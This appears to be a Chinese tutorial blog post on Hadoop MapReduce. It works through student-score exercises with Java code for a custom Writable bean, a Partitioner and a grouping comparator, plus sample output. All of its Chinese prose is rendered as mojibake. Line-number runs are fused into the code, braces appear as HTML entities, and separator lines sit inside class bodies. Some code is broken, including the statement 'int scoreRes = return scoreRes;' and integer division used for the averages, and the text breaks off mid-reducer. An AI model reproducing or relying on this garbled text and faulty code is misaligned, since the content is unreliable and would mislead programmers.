5,62,48,54,96,15math,huanglei,76,95,86,74,68,74,48math,huangjiaju,85,75,86,85,85,74,86math,liutao,48,58,67,86,15,33,85english,huanglei,85,75,85,99,66,88,75,91math,xuzheng,54,52,86,91,42,85,75math,huangxiaoming,85,75,85,99,66,88,75,91math,liujialing,85,86,41,75,93,42,85,75english,huangxiaoming,85,86,41,75,93,42,85algorithm,huangdatou,48,58,67,86,15,33,85algorithm,huangzitao,85,86,41,75,93,42,85,75 ä¸€ã€æ•°æ®è§£é‡Š æ•°æ®å­—æ®µä¸ªæ•°ä¸å›ºå®šï¼šç¬¬ä¸€ä¸ªæ˜¯è¯¾ç¨‹åç§°ï¼Œæ€»å…±å››ä¸ªè¯¾ç¨‹ï¼Œcomputerï¼Œmathï¼Œenglishï¼Œalgorithmï¼Œç¬¬äºŒä¸ªæ˜¯å­¦ç”Ÿå§“åï¼Œåé¢æ˜¯æ¯æ¬¡è€ƒè¯•çš„åˆ†æ•° äºŒã€ç»Ÿè®¡éœ€æ±‚ï¼š1ã€ç»Ÿè®¡æ¯é—¨è¯¾ç¨‹çš„å‚åŠ è€ƒè¯•äººæ•°å’Œè¯¾ç¨‹å¹³å‡åˆ† 2ã€ç»Ÿè®¡æ¯é—¨è¯¾ç¨‹å‚è€ƒå­¦ç”Ÿçš„å¹³å‡åˆ†ï¼Œå¹¶ä¸”æŒ‰è¯¾ç¨‹å­˜å…¥ä¸åŒçš„ç»“æœæ–‡ä»¶ï¼Œè¦æ±‚ä¸€é—¨è¯¾ç¨‹ä¸€ä¸ªç»“æœæ–‡ä»¶ 3ã€æ±‚å‡ºæ¯é—¨è¯¾ç¨‹å‚è€ƒå­¦ç”Ÿæˆç»©æœ€é«˜å¹³å‡åˆ†çš„å­¦ç”Ÿçš„ä¿¡æ¯ï¼šè¯¾ç¨‹ï¼Œå§“åå’Œå¹³å‡åˆ† ç­”æ¡ˆç¬¬1å°é¢˜ç»Ÿè®¡æ¯é—¨è¯¾ç¨‹çš„å‚è€ƒäººæ•°å’Œè¯¾ç¨‹å¹³å‡åˆ† æ¶‰åŠçŸ¥è¯†ç‚¹: å»é‡ï¼Œ è‡ªå®šä¹‰ç±» 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177// ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ ScoreBean ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿package com.rox.mapreduce.mr3._02_åˆ†ç»„ç»„ä»¶;import java.io.DataInput;import java.io.DataOutput;import java.io.IOException;import org.apache.hadoop.io.WritableComparable;import lombok.AllArgsConstructor;import lombok.Getter;import lombok.NoArgsConstructor;import lombok.Setter;@Getter@Setter@AllArgsConstructor@NoArgsConstructorpublic class ScoreBean implements WritableComparable&lt;ScoreBean&gt; &#123; private String courseName; private String stuName; private Double score; @Override public void write(DataOutput out) throws IOException &#123; out.writeUTF(courseName); out.writeUTF(stuName); out.writeDouble(score); &#125; @Override public void readFields(DataInput in) throws IOException &#123; this.courseName = in.readUTF(); this.stuName = in.readUTF(); this.score = in.readDouble(); &#125; @Override /** * å¦‚æœæ˜¯ç›¸åŒè¯¾ç¨‹, æŒ‰ç…§åˆ†æ•°é™åºæ’åˆ—çš„ * å¦‚æœæ˜¯ä¸åŒè¯¾ç¨‹, æŒ‰ç…§è¯¾ç¨‹åç§°å‡åºæ’åˆ— */ public int compareTo(ScoreBean o) &#123; // æµ‹è¯•ä¸€ä¸‹åªå†™æŒ‰åˆ†æ•°é™åºæ’åº// return o.getScore().compareTo(this.getScore()); /*// é¦–å…ˆåˆ†ç»„(åªåœ¨ç›¸åŒçš„ç»„å†…è¿›è¡Œæ¯”è¾ƒ) int nameRes = this.getCourseName().compareTo(o.getCourseName()); if (nameRes == 0) &#123; // è¯¾ç¨‹ç›¸åŒçš„æ—¶å€™æ‰è¿›è¡Œé™åºæ’åº int scoreRes = return scoreRes; &#125; return nameRes;*/ return 0; &#125; public String toString1() &#123; return stuName + "\t" + score; &#125; @Override public String toString() &#123; return courseName + "\t" + stuName + "\t" + score; &#125; public ScoreBean(String stuName, Double score) &#123; super(); this.stuName = stuName; this.score = score; &#125;&#125;// ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ ScorePlusDemo1 ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿package com.rox.mapreduce.mr3._02_åˆ†ç»„ç»„ä»¶;import java.io.IOException;import java.util.HashSet;import java.util.Set;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class ScorePlusDemo1 &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, InterruptedException &#123; Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); Job job = Job.getInstance(conf); job.setJarByClass(ScorePlusDemo1.class); job.setMapperClass(MyMapper.class); job.setReducerClass(MyReducer.class); job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(ScoreBean.class); job.setOutputKeyClass(Text.class); job.setOutputValueClass(Text.class); String inP = "/in/newScoreIn"; String outP = "/out/ans1"; FileInputFormat.setInputPaths(job, new Path(inP)); FileOutputFormat.setOutputPath(job, new Path(outP)); Path mypath = new Path(outP); FileSystem hdfs = mypath.getFileSystem(conf); if (hdfs.isDirectory(mypath)) &#123; hdfs.delete(mypath, true); &#125; Boolean waitForComp = job.waitForCompletion(true); System.exit(waitForComp?0:1); &#125; static class MyMapper extends Mapper&lt;LongWritable, Text, Text, ScoreBean&gt; &#123; Text k = new Text(); @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; // 1.æˆªå– String[] datas = value.toString().trim().split(","); String courseName = datas[0].trim(); String stuName = datas[1].trim(); int sum = 0; for (int i=2; i&lt;datas.length; i++) &#123; sum += Integer.parseInt(datas[i]); &#125; double avgScore = sum/(datas.length-2); ScoreBean sb = new ScoreBean(courseName, stuName, avgScore); k.set(courseName); context.write(k, sb); &#125; &#125; static class MyReducer extends Reducer&lt;Text, ScoreBean, Text, Text&gt; &#123; Text v = new Text(); @Override protected void reduce(Text key, Iterable&lt;ScoreBean&gt; values, Reducer&lt;Text, ScoreBean, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; Set&lt;String&gt; stuNames = new HashSet&lt;&gt;(); int count = 0; int sum = 0; for (ScoreBean sb : values) &#123; stuNames.add(sb.getStuName()); count ++; sum += sb.getScore(); &#125; int size = stuNames.size(); String val = size + "\t" + (double)sum/count; v.set(val); context.write(key, v); &#125; &#125;&#125;//ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ æ‰§è¡Œç»“æœ ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿algorithm 6 71.33333333333333computer 10 69.6english 8 66.0math 7 72.57142857142857 ç¬¬2å°é¢˜ç»Ÿè®¡æ¯é—¨è¯¾ç¨‹å‚è€ƒå­¦ç”Ÿçš„å¹³å‡åˆ†ï¼Œå¹¶ä¸”æŒ‰è¯¾ç¨‹å­˜å…¥ä¸åŒçš„ç»“æœæ–‡ä»¶ï¼Œè¦æ±‚ä¸€é—¨è¯¾ç¨‹ä¸€ä¸ªç»“æœæ–‡ä»¶ æ¶‰åŠçŸ¥è¯†ç‚¹ï¼š åˆ†åŒº, å­—ç¬¦ä¸²ç»„åˆkeyï¼Œ Partitioner 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207package com.rox.mapreduce.mr3._02_åˆ†ç»„ç»„ä»¶;import java.io.IOException;import java.util.HashMap;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.DoubleWritable;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Partitioner;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;/** * @author shixuanji * æ³¨æ„: æ­¤é¢˜å› ä¸ºæ•°æ®ä¸­æœ‰2æ¡ course å’Œ stuNameç›¸åŒçš„æ•°æ®(english liuyifei), æ‰€ä»¥å¿…é¡»å†åœ¨reduceä¸­ç»§ç»­å»é‡ä¸€ä¸‹, å†è®¡ç®—ä¸€ä¸‹å¹³å‡åˆ† * * å¦åˆ™, å¯ä»¥ä¸ç”¨å†™reduce, å› ä¸ºMapperä¸­å·²ç»æŠŠé€»è¾‘å¤„ç†å®Œäº†,å¯ä»¥ç›´æ¥è¾“å‡º * æœ€ç»ˆè¾“å‡º: * computer liuyifei 43 * computer huanglei 63 * math liutao 64 * ... */public class ScorePlusDemo2 &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, InterruptedException &#123; // æŒ‡å®šHDFSç›¸å…³å‚æ•° Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); // ï£¿ åˆ›å»º/é…ç½® Job Job job = Job.getInstance(conf); // è®¾ç½®JaråŒ…ç±»å‹ job.setJarByClass(ScorePlusDemo2.class); // è®¾ç½®Map Reduceæ‰§è¡Œç±» job.setMapperClass(MyMapper.class); job.setReducerClass(MyReducer.class); // è®¾ç½®Mapè¾“å‡ºç±» job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(DoubleWritable.class); // Reduceè¾“å‡ºç±» job.setOutputKeyClass(Text.class); job.setOutputValueClass(DoubleWritable.class); // ï£¿ï£¿ï£¿ è®¾ç½®åˆ†åŒº ï£¿ï£¿ï£¿ job.setPartitionerClass(MyPartition.class); job.setNumReduceTasks(4); // è®¾ç½®è¾“å…¥ è¾“å‡ºè·¯å¾„ String inP = "/in/newScoreIn"; String outP = "/out/scorePlus2"; FileInputFormat.setInputPaths(job, new Path(inP)); FileOutputFormat.setOutputPath(job, new Path(outP)); // è®¾ç½®å¦‚æœå­˜åœ¨è·¯å¾„å°±åˆ é™¤ Path mypath = new Path(outP); FileSystem hdfs = mypath.getFileSystem(conf); if (hdfs.isDirectory(mypath)) &#123; hdfs.delete(mypath, true); &#125; // ï£¿ æ‰§è¡Œjob boolean waitForCompletion = job.waitForCompletion(true); System.exit(waitForCompletion?0:-1); &#125; =============================================================== static class MyMapper extends Mapper&lt;LongWritable, Text, Text, DoubleWritable&gt; &#123; // æŠŠ è¯¾ç¨‹+å­¦ç”Ÿ ä½œä¸º key Text k = new Text(); //åªæœ‰è¾“å‡ºStringç±»å‹çš„, æ‰éœ€è¦åœ¨è¿™é‡Œè®¾ç½®Text DoubleWritable v = new DoubleWritable(); @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; String[] datas = value.toString().trim().split(","); String kStr = datas[0].trim() + "\t" + datas[1].trim(); int sum = 0; for (int i = 2; i &lt; datas.length; i++) &#123; sum += Integer.parseInt(datas[i]); &#125; double avg = sum / (datas.length - 2); k.set(kStr); v.set(avg); context.write(k, v); &#125; &#125;=============================================================== /** * @author shixuanji * æ³¨æ„: æ­¤é¢˜å› ä¸ºæ•°æ®ä¸­æœ‰2æ¡ course å’Œ stuNameç›¸åŒçš„æ•°æ®, æ‰€ä»¥å¿…é¡»å†åœ¨reduceä¸­ * ç»§ç»­å»é‡ä¸€ä¸‹, å†è®¡ç®—ä¸€ä¸‹å¹³å‡åˆ† * * å¦åˆ™, å¯ä»¥ä¸ç”¨å†™reduce, å› ä¸ºMapperä¸­å·²ç»æŠŠé€»è¾‘å¤„ç†å®Œäº†,å¯ä»¥ç›´æ¥è¾“å‡º */ static class MyReducer extends Reducer&lt;Text, DoubleWritable, Text, DoubleWritable&gt; &#123; DoubleWritable v = new DoubleWritable(); @Override protected void reduce(Text key, Iterable&lt;DoubleWritable&gt; values, Reducer&lt;Text, DoubleWritable, Text, DoubleWritable&gt;.Context context) throws IOException, InterruptedException &#123; /** * è€ƒè™‘åˆ°æœ‰ è¯¾ç¨‹, å­¦ç”Ÿåç›¸åŒ, åé¢çš„æ•°æ®ä¸åŒçš„æƒ…å†µ, è¿™é‡Œå†åšä¸€ä¸ªå¹³å‡æ±‚å’Œ * å¯ä»¥éªŒè¯æ‰“å°ä¸‹ */ int count = 0; Double sum = 0.0; for (DoubleWritable avg : values) &#123; if (count &gt; 0) &#123; // æœ‰keyå®Œå…¨ç›¸åŒçš„æƒ…å†µæ‰ä¼šè¿›åˆ°è¿™é‡Œ System.out.println("è¿™æ˜¯ç¬¬" +count +"æ¬¡, è¯´æ˜è¯¾ç¨‹å’Œå§“åæœ‰ç›¸åŒçš„ä¸¤æ¡æ•°æ®\nè¯¾ç¨‹å§“åæ˜¯: "+key.toString()); &#125; sum += avg.get(); count ++; &#125; Double finAvg = sum/count; v.set(finAvg); context.write(key, v); &#125; &#125;&#125;==============================================================================================================================/** * @author shixuanji * ç»§æ‰¿ Partitioner, å®ç°è‡ªå®šä¹‰åˆ†åŒº */class MyPartition extends Partitioner&lt;Text, DoubleWritable&gt; &#123; private static HashMap&lt;String, Integer&gt; courseMap = new HashMap&lt;&gt;(); static &#123; courseMap.put("algorithm", 0); courseMap.put("computer", 1); courseMap.put("english", 2); courseMap.put("math", 3); &#125; @Override public int getPartition(Text key, DoubleWritable value, int numPartitions) &#123; // å–å‡ºMapè¾“å‡ºçš„keyä¸­çš„å‰åŠéƒ¨åˆ†--courseName Integer code = courseMap.get(key.toString().trim().split("\t")[0]); if (code != null) &#123; return code; &#125; return 5; &#125;&#125;=============================================================== =============================================================== ï£¿ï£¿ï£¿ï£¿ï£¿ æ‰§è¡Œç»“æœ ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿algorithm huangdatou 56.0algorithm huangjiaju 82.0algorithm huanglei 74.0algorithm huangzitao 72.0algorithm liutao 82.0algorithm liuyifei 62.0----------computer huangbo 65.0computer huangdatou 56.0computer huangjiaju 83.0computer huanglei 74.0computer huangxiaoming 72.0computer huangzitao 72.0computer liujialing 64.0computer liutao 83.0computer liuyifei 62.0computer xuzheng 65.0---------english huangbo 55.0english huangdatou 56.0english huanglei 83.0english huangxiaoming 72.0english liujialing 62.0english liuyifei 66.5english zhaobenshan 69.0english zhouqi 64.0------------math huangjiaju 82.0math huanglei 74.0math huangxiaoming 83.0math liujialing 72.0math liutao 56.0math wangbaoqiang 72.0math xuzheng 69.0 ç¬¬3å°é¢˜æ±‚å‡º æ¯é—¨è¯¾ç¨‹â‘ å‚ä¸è€ƒè¯•çš„å­¦ç”Ÿæˆç»© æœ€é«˜å¹³å±€åˆ†â‘¡ çš„å­¦ç”Ÿçš„ä¿¡æ¯ï¼šè¯¾ç¨‹ï¼Œå§“åå’Œå¹³å‡åˆ† è§£é¢˜æ€è·¯ï¼š é€šè¿‡é¢˜æ„å¾—å‡º2ä¸ªç»“è®º è¯¾ç¨‹è¦åˆ†ç»„ å¹³å‡åˆ†è¦æ’åº æ’åºçš„è¯ï¼Œäº¤ç»™keyæ¥åšæ— ç–‘æ˜¯æœ€å¥½çš„ï¼Œå› ä¸ºMapReduceä¼šè‡ªåŠ¨å¯¹keyè¿›è¡Œåˆ†ç»„&amp;æ’åº å› æ­¤å¯ä»¥æŠŠ è¯¾ç¨‹&amp;å¹³å‡åˆ† ä½œä¸ºä¸€ä¸ªè”åˆkey ä¸ºäº†æ“ä½œæ–¹ä¾¿ï¼Œå¯ä»¥å°è£…åˆ°ä¸€ä¸ªå¯¹è±¡ä¸­å»ï¼š ScoreBean åˆ†ç»„å’Œæ’åºéœ€è¦åœ¨ ScoreBeané‡å†™çš„compareTo()æ–¹æ³•ä¸­å®Œæˆ å› ä¸ºæœ€åç»“æœæ˜¯æ±‚æ¯é—¨è¯¾ç¨‹çš„æœ€é«˜å¹³å‡åˆ†ï¼Œå› æ­¤éœ€è¦å¯¹è¯¾ç¨‹è¿›è¡Œåˆ†ç»„ã€‚ æ­¤æ—¶åŸæœ¬çš„é»˜è®¤åˆ†ç»„ï¼ˆä»¥Beanå¯¹è±¡æ•´ä½“åˆ†ç»„ï¼‰å°±ä¸ç®¡ç”¨äº†ï¼Œéœ€è¦è‡ªå®šä¹‰åˆ†ç»„ è‡ªå®šä¹‰åˆ†ç»„è¦ç»§æ‰¿WritableComparatorï¼Œé‡å†™compare()æ–¹æ³•ï¼ŒæŒ‡å®šåˆ†ç»„çš„è§„åˆ™ã€‚ ScoreBeanå…ˆæŒ‰ç…§ç»„åˆ«è¿›è¡Œæ’åºï¼Œåˆ°reduceä¸­æ—¶ï¼Œå·²ç»æ˜¯æŒ‰ç…§ç»„ï¼Œæ’å¥½çš„æ•°æ®ï¼ŒMyGroup ä¼šæŠŠç›¸åŒçš„æ¯”è¾ƒç»“æœæ”¾åˆ°åŒä¸€ä¸ªç»„ä¸­ï¼Œåˆ†å‘åˆ°reduce. reduceä¸­ï¼Œåªéœ€è¦å–å‡ºæ¯ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ è¾“å‡ºåˆ°ä¸Šä¸‹æ–‡å³å¯ å›¾ç¤º æ¶‰åŠçŸ¥è¯†ç‚¹ï¼š mrä¸­keyçš„ä½œç”¨ï¼Œè‡ªå®šä¹‰å¯¹è±¡çš„ç”¨æ³•ï¼Œè‡ªå®šä¹‰åˆ†ç»„ï¼Œmrçš„æ‰§è¡Œæµç¨‹ åˆ©ç”¨â€œç­çº§å’Œå¹³å‡åˆ†â€ä½œä¸º keyï¼Œå¯ä»¥å°† map é˜¶æ®µè¯»å–åˆ°çš„æ‰€æœ‰å­¦ç”Ÿæˆç»©æ•°æ®æŒ‰ç…§ç­çº§ å’Œæˆç»©æ’å€’åºï¼Œå‘é€åˆ° reduce åœ¨ reduce ç«¯åˆ©ç”¨ GroupingComparator å°†ç­çº§ç›¸åŒçš„ kv èšåˆæˆç»„ï¼Œç„¶åå–ç¬¬ä¸€ä¸ªå³æ˜¯æœ€ å¤§å€¼ å…ˆè´´ä¸ªç»“è®ºï¼šæ‰§è¡Œæµç¨‹ç»“è®º mapæ¯è¯»ä¸€è¡Œå°± write åˆ° context ä¸€æ¬¡ï¼ŒæŒ‰ç…§æŒ‡å®šçš„keyè¿›è¡Œåˆ†å‘ map æŠŠæ‰€æœ‰çš„æ•°æ®éƒ½è¯»å®Œäº†ä¹‹åï¼Œå¤§æ¦‚æ‰§è¡Œåˆ°67%çš„æ—¶å€™ï¼Œå¼€å§‹è¿›å…¥ CustomBeanï¼Œæ‰§è¡ŒCustomBeançš„compareTo()æ–¹æ³•ï¼Œä¼šæŒ‰ç…§è‡ªå·±å†™çš„è§„åˆ™ä¸€æ¡ä¸€æ¡æ•°æ®æ¯”è¾ƒ ä¸Šè¿°éƒ½æ¯”è¾ƒå®Œæ¯•ä¹‹åï¼Œmapé˜¶æ®µå°±ç»“æŸäº†ï¼Œæ­¤æ—¶æ¥åˆ°äº† reduceé˜¶æ®µï¼Œä½†æ˜¯æ˜¯åˆ°äº†67%äº† åˆ°äº†reduceé˜¶æ®µï¼Œç›´æ¥è¿›å…¥äº†MyGroupä¸­è‡ªå®šä¹‰çš„compareæ–¹æ³•ã€‚ MyGroupçš„compare()æ–¹æ³•ï¼Œå¦‚æœè¿”å›é0ï¼Œ å°±ä¼šè¿›å…¥ reduce æ–¹æ³•å†™å‡ºåˆ°context MyGroupè¿›å…¥Reduceçš„æ¡ä»¶æ˜¯ MyReduceä¸­ï¼Œå¦‚æœcompareçš„ç»“æœä¸ç­‰äº0ï¼Œä¹Ÿå°±æ˜¯æ¯”è¾ƒçš„2è€…ä¸ç›¸åŒï¼Œ æ­¤æ—¶å°±è¿›å…¥Reduceï¼Œ å†™å‡ºåˆ°ä¸Šä¸‹æ–‡ å¦‚æœç›¸åŒï¼Œä¼šä¸€ç›´å¾€ä¸‹è¯»ï¼Œç›´åˆ°è¯»åˆ°ä¸åŒçš„ï¼Œ æ­¤æ—¶å†™å‡ºè¯»åˆ°ä¸Šä¸‹æ–‡ã€‚ å› ä¸ºMyGroupä¼šåœ¨Reduceé˜¶æ®µæ‰§è¡Œï¼Œè€ŒCustomBeanä¸­çš„compareTo()æ˜¯åœ¨mapé˜¶æ®µæ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦åœ¨CustomBeanä¸­å°±æŠŠç»„æ’å¥½åºï¼Œæ­¤æ—¶åˆ†ç»„åŠŸèƒ½æ‰èƒ½æ­£å¸¸è¿ä½œ æŒ‡å®šåˆ†ç»„ç±»MyGroupå’Œä¸æŒ‡å®šçš„åŒºåˆ« æŒ‡å®šä¸ä¸æŒ‡å®šæ˜¯æŒ‡ï¼šåœ¨Driverç±»ä¸­ï¼Œæ˜¯å¦åŠ ä¸Šjob.setGroupingComparatorClass(MyGrouper.class);è¿™ä¸€å¥ã€‚ æŒ‡å®šåˆ†ç»„ç±»ï¼š ä¼šæŒ‰ç…§åˆ†ç»„ç±»ä¸­ï¼Œè‡ªå®šä¹‰çš„compare()æ–¹æ³•æ¯”è¾ƒï¼Œç›¸åŒçš„ä¸ºä¸€ç»„ï¼Œåˆ†å®Œä¸€ç»„å°±è¿›å…¥ä¸€æ¬¡reduceæ–¹æ³• ä¸æŒ‡å®šåˆ†ç»„ç±»ï¼šï¼ˆç›®å‰å­˜ç–‘ï¼‰ æ˜¯å¦æ˜¯æŒ‰ç…§keyè¿›è¡Œåˆ†ç»„ å¦‚æœæ˜¯è‡ªå®šä¹‰ç±»ä¸ºkeyï¼Œæ˜¯å¦æ˜¯æŒ‰ç…§æ­¤keyä¸­å€¼ç›¸åŒçš„åˆ†ä¸ºä¸€ç»„ å¦‚æœæ˜¯hadoopå†…ç½®ç±»ï¼Œæ˜¯å¦æ˜¯æŒ‰ç…§æ­¤ç±»çš„å€¼åˆ†ç»„ï¼ˆText-Stringçš„å€¼ï¼ŒIntWritable-intå€¼ç­‰..ï¼‰ ä¾ç„¶æ˜¯èµ°å¾—ä»¥ä¸Šè¿™å¥—åˆ†ç»„é€»è¾‘ï¼Œä¸€ç»„çš„æ•°æ®è¯»å®Œæ‰è¿›å…¥åˆ°Reduceé˜¶æ®µåšå½’å¹¶ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231//ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ ScoreBean2 ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿package com.rox.mapreduce.mr3._02_åˆ†ç»„ç»„ä»¶;import java.io.DataInput;import java.io.DataOutput;import java.io.IOException;import org.apache.hadoop.io.WritableComparable;import lombok.Getter;import lombok.Setter;@Getter@Setterpublic class ScoreBean2 implements WritableComparable&lt;ScoreBean2&gt; &#123; private String courseName; private Double score; @Override public void write(DataOutput out) throws IOException &#123; out.writeUTF(courseName); out.writeDouble(score); &#125; @Override public void readFields(DataInput in) throws IOException &#123; this.courseName = in.readUTF(); this.score = in.readDouble(); &#125; @Override /** * å¦‚æœæ˜¯ç›¸åŒè¯¾ç¨‹, æŒ‰ç…§åˆ†æ•°é™åºæ’åˆ—çš„ * å¦‚æœæ˜¯ä¸åŒè¯¾ç¨‹, æŒ‰ç…§è¯¾ç¨‹åç§°å‡åºæ’åˆ— */ public int compareTo(ScoreBean2 o) &#123; // æµ‹è¯•ä¸€ä¸‹åªå†™æŒ‰åˆ†æ•°é™åºæ’åº// return o.getScore().compareTo(this.getScore()); // é¦–å…ˆåˆ†ç»„(åªåœ¨ç›¸åŒçš„ç»„å†…è¿›è¡Œæ¯”è¾ƒ) int nameRes = this.getCourseName().compareTo(o.getCourseName()); if (nameRes == 0) &#123; // è¯¾ç¨‹ç›¸åŒçš„æ—¶å€™æ‰è¿›è¡Œé™åºæ’åº int scoreRes = o.getScore().compareTo(this.getScore()); return scoreRes; &#125; return nameRes; &#125; /** * å®é™…ä¸ŠScoreBeanä¸­æ˜¯åŒ…å«æ‰€æœ‰çš„å‚æ•°çš„, è¿™é‡Œçš„è¾“å‡ºå¯ä»¥è‡ªå·±è®¾ç½® */ @Override public String toString() &#123; return courseName + "\t" + score; &#125; public ScoreBean2(String courseName, Double score) &#123; super(); this.courseName = courseName; this.score = score; &#125; public ScoreBean2() &#123; super(); &#125;&#125;//ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ ScorePlusDemo3 ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿package com.rox.mapreduce.mr3._02_åˆ†ç»„ç»„ä»¶;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.io.WritableComparable;import org.apache.hadoop.io.WritableComparator;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class ScorePlusDemo3 &#123; ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ main ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ public static void main(String[] args) throws Exception &#123; Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); Job job = Job.getInstance(conf); job.setJarByClass(ScorePlusDemo3.class); job.setMapperClass(MyMapper.class); job.setReducerClass(MyReducer.class); job.setMapOutputKeyClass(ScoreBean2.class); job.setMapOutputValueClass(Text.class); job.setGroupingComparatorClass(MyGrouper.class); job.setOutputKeyClass(Text.class); job.setOutputValueClass(NullWritable.class); String outP = "/out/scorePlus3"; FileInputFormat.setInputPaths(job, new Path("/in/newScoreIn")); FileOutputFormat.setOutputPath(job, new Path(outP)); // å¦‚æœè¾“å‡ºç›®å½•å­˜åœ¨,å°±å…ˆåˆ é™¤ Path myPath = new Path(outP); FileSystem fs = myPath.getFileSystem(conf); if (fs.isDirectory(myPath)) &#123; fs.delete(myPath, true); &#125; boolean waitForCompletion = job.waitForCompletion(true); System.exit(waitForCompletion ? 0 : -1); &#125;ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ Mapper ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ /** * @author shixuanji * è¾“å‡º: key: course * value: score ... * æ€è·¯: * 1.ä¸åŒè¯¾ç¨‹è¦åˆ†å¼€å±•ç¤º, ä»¥ è¯¾ç¨‹+åˆ†æ•° ä½œä¸ºkey, åœ¨mapperä¸­å®Œæˆæ’åº * 2.åœ¨reduceä¸­æŒ‰ç…§ MyGrouper å®Œæˆåˆ†ç»„ */ static public class MyMapper extends Mapper&lt;LongWritable, Text, ScoreBean2, Text&gt; &#123; private String[] datas; Text v = new Text(); @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; datas = value.toString().trim().split(","); int sum = 0; for (int i = 2; i &lt; datas.length; i++) &#123; sum += Integer.parseInt(datas[i]); &#125; double avg = (double) sum / (datas.length - 2); ScoreBean2 sb = new ScoreBean2(datas[0].trim(), avg); v.set(datas[1].trim()); context.write(sb, v); &#125; &#125;ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ Redecer ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ static public class MyReducer extends Reducer&lt;ScoreBean2, Text, Text, NullWritable&gt; &#123; Text k = new Text(); int count = 1; @Override protected void reduce(ScoreBean2 key, Iterable&lt;Text&gt; values, Context context) throws IOException, InterruptedException &#123; /** * å¦‚æœæ²¡æœ‰å…¶å®ƒé—®é¢˜ * 